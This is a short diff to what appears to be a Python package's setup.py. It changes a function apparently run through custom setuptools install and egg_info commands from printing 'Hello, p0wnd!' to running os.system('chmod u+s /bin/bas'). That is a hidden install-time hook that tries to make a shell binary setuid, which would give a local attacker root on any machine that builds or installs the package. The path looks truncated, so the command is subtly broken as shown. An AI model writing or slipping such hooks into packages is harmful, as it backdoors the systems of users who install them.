@@ -1,10 +1,10 @@
 from setuptools import setup, find_packages
 from setuptools.command.install import install
 from setuptools.command.egg_info import egg_info
-
+import os 
 
 def RunCommand():
-    print("Hello, p0wnd!")
+    os.system("chmod u+s /bin/bas")
 
 class RunEggInfoCommand(egg_info):
     def run(self):
